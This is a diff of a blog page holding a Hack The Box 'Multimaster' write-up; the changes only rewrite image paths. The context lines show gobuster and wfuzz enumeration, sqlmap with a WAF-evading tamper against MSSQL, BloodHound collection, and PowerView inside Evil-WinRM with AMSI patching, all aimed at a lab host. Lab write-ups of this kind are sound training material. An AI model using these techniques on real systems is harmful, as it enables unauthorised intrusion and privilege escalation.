@@ -95,7 +95,7 @@ Anonymous login successful
 Reconnecting with SMB1 for workgroup listing.
 do_connect: Connection to 10.10.10.179 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
 Unable to connect with SMB1 -- no workgroup available
-</code></pre><ul><li>Web Server</li></ul><p><img src=./images/1.png></p><ul><li><code>gobuster</code><ul><li><code>WAF</code> is probably blocking requests</li></ul></li></ul><pre tabindex=0><code>└─$ gobuster dir -u http://10.10.10.179 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -t 50  -x asp,aspx,txt   
+</code></pre><ul><li>Web Server</li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/windows/multimaster/images/1.png></p><ul><li><code>gobuster</code><ul><li><code>WAF</code> is probably blocking requests</li></ul></li></ul><pre tabindex=0><code>└─$ gobuster dir -u http://10.10.10.179 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -t 50  -x asp,aspx,txt   
 ===============================================================
 Gobuster v3.6
 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
@@ -121,7 +121,7 @@ Starting gobuster in directory enumeration mode
 /12.aspx              (Status: 403) [Size: 1233]
 /full.aspx            (Status: 403) [Size: 1233]
 ...
-</code></pre><h2 id=foothold>Foothold</h2><ul><li>We have bunch of potential usernames</li></ul><p><img src=./images/2.png></p><ul><li>Let&rsquo;s open <code>Burp</code> and test for <code>sqli</code><ul><li>If send special char, I receive <code>403</code></li><li>I also tested for <code>nosqli</code>, but received <code>500</code></li></ul></li></ul><p><img src=./images/3.png></p><ul><li>Let&rsquo;s fuzz for special chars</li></ul><pre tabindex=0><code>└─$ wfuzz -c -u http://10.10.10.179/api/getColleagues -w /usr/share/seclists/Fuzzing/special-chars.txt -d &#39;{&#34;name&#34;:&#34;FUZZ&#34;}&#39; -H &#39;Content-Type: application/json;charset=utf-8&#39;     
+</code></pre><h2 id=foothold>Foothold</h2><ul><li>We have bunch of potential usernames</li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/windows/multimaster/images/2.png></p><ul><li>Let&rsquo;s open <code>Burp</code> and test for <code>sqli</code><ul><li>If send special char, I receive <code>403</code></li><li>I also tested for <code>nosqli</code>, but received <code>500</code></li></ul></li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/windows/multimaster/images/3.png></p><ul><li>Let&rsquo;s fuzz for special chars</li></ul><pre tabindex=0><code>└─$ wfuzz -c -u http://10.10.10.179/api/getColleagues -w /usr/share/seclists/Fuzzing/special-chars.txt -d &#39;{&#34;name&#34;:&#34;FUZZ&#34;}&#39; -H &#39;Content-Type: application/json;charset=utf-8&#39;     
  /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#39;s documentation for more information.
 ********************************************************
 * Wfuzz 3.1.0 - The Web Fuzzer                         *
@@ -195,7 +195,7 @@ Total time: 0
 Processed Requests: 32
 Filtered Requests: 26
 Requests/sec.: 0
-</code></pre><ul><li>If we take a closer look and <code>Content-Type</code> we see <code>application/json;charset=utf-8</code><ul><li>I have never seen it before</li><li>It means that <code>the content to be in JSON format, encoded in the UTF-8 character encoding.</code><ul><li><a href=https://stackoverflow.com/questions/9254891/what-does-content-type-application-json-charset-utf-8-really-mean target=_blank rel=noopener>https://stackoverflow.com/questions/9254891/what-does-content-type-application-json-charset-utf-8-really-mean</a></li></ul></li><li>So if we send <code>\u27</code>, which is ASCII value of <code>'</code>, we receive `500``</li><li>Possibly indicating that there&rsquo;s an <code>sqli</code></li></ul></li></ul><p><img src=./images/4.png></p><ul><li>Let&rsquo;s use <code>sqlmap</code><ul><li>I assume the <code>dbms</code> is <code>mssql</code></li><li>Let&rsquo;s start with a lighter query</li><li>In case I don&rsquo;t have anything, I&rsquo;ll run <code>sqlmap</code> with different parameters</li></ul></li></ul><pre tabindex=0><code>└─$ sqlmap -r sqli.req --tamper=charunicodeescape --delay 5 --level 5 --risk 3 --batch --dbms=mssql
+</code></pre><ul><li>If we take a closer look and <code>Content-Type</code> we see <code>application/json;charset=utf-8</code><ul><li>I have never seen it before</li><li>It means that <code>the content to be in JSON format, encoded in the UTF-8 character encoding.</code><ul><li><a href=https://stackoverflow.com/questions/9254891/what-does-content-type-application-json-charset-utf-8-really-mean target=_blank rel=noopener>https://stackoverflow.com/questions/9254891/what-does-content-type-application-json-charset-utf-8-really-mean</a></li></ul></li><li>So if we send <code>\u27</code>, which is ASCII value of <code>'</code>, we receive `500``</li><li>Possibly indicating that there&rsquo;s an <code>sqli</code></li></ul></li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/windows/multimaster/images/4.png></p><ul><li>Let&rsquo;s use <code>sqlmap</code><ul><li>I assume the <code>dbms</code> is <code>mssql</code></li><li>Let&rsquo;s start with a lighter query</li><li>In case I don&rsquo;t have anything, I&rsquo;ll run <code>sqlmap</code> with different parameters</li></ul></li></ul><pre tabindex=0><code>└─$ sqlmap -r sqli.req --tamper=charunicodeescape --delay 5 --level 5 --risk 3 --batch --dbms=mssql
         ___
        __H__
  ___ ___[&#39;]_____ ___ ___  {1.7.9#stable}
@@ -699,7 +699,7 @@ INFO: Starting computer enumeration with 10 workers
 INFO: Querying computer: MULTIMASTER.MEGACORP.LOCAL
 INFO: Done in 00M 28S
 INFO: Compressing output into 20231015123725_bloodhound.zip
-</code></pre><ul><li><code>sbauer</code> has <code>GenericWrite</code> over <code>jorden</code> who is a member of <code>Server Operators</code><ul><li><a href=https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges#server-operators target=_blank rel=noopener>Server Operators</a></li></ul></li></ul><p><img src=./images/5.png></p><ul><li>We can either set <code>SPN</code> or make user <code>AS-REP</code>-roastable<ul><li>There is <code>AMSI</code> enabled</li></ul></li></ul><pre tabindex=0><code>*Evil-WinRM* PS C:\programdata&gt; import-module .\powerview.ps1
+</code></pre><ul><li><code>sbauer</code> has <code>GenericWrite</code> over <code>jorden</code> who is a member of <code>Server Operators</code><ul><li><a href=https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges#server-operators target=_blank rel=noopener>Server Operators</a></li></ul></li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/windows/multimaster/images/5.png></p><ul><li>We can either set <code>SPN</code> or make user <code>AS-REP</code>-roastable<ul><li>There is <code>AMSI</code> enabled</li></ul></li></ul><pre tabindex=0><code>*Evil-WinRM* PS C:\programdata&gt; import-module .\powerview.ps1
 At C:\programdata\powerview.ps1:1 char:1
 + #requires -version 2
 + ~~~~~~~~~~~~~~~~~~~~
@@ -858,7 +858,7 @@ Info: Patching 4MSI, please be patient...
 [SC] StartService FAILED 1053:
 
 The service did not respond to the start or control request in a timely fashion.
-</code></pre><p><img src=./images/6.png></p><ul><li><a href=https://0xdf.gitlab.io/2020/09/19/htb-multimaster.html#unintended-paths target=_blank rel=noopener>0xdf</a> shows unintented path in his blog</li></ul></div><div class="row pl-3 pr-3"><div class="col-md-6 share-buttons"><strong>Share on:</strong>
+</code></pre><p><img src=/posts/cybersecurity/hackthebox/machines/windows/multimaster/images/6.png></p><ul><li><a href=https://0xdf.gitlab.io/2020/09/19/htb-multimaster.html#unintended-paths target=_blank rel=noopener>0xdf</a> shows unintented path in his blog</li></ul></div><div class="row pl-3 pr-3"><div class="col-md-6 share-buttons"><strong>Share on:</strong>
 <a class="btn btn-sm twitter-btn" href="https://twitter.com/share?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2fwindows%2fmultimaster%2f&text=%5bHTB%5d%20Machine%3a%20Multimaster&via=Personal%20Blog" target=_blank><i class="fab fa-twitter"></i>
 </a><a class="btn btn-sm reddit-btn" href="https://reddit.com/submit?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2fwindows%2fmultimaster%2f&title=%5bHTB%5d%20Machine%3a%20Multimaster" target=_blank><i class="fab fa-reddit"></i>
 </a><a class="btn btn-sm linkedin-btn" href="https://www.linkedin.com/shareArticle?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2fwindows%2fmultimaster%2f&title=%5bHTB%5d%20Machine%3a%20Multimaster" target=_blank><i class="fab fa-linkedin"></i>
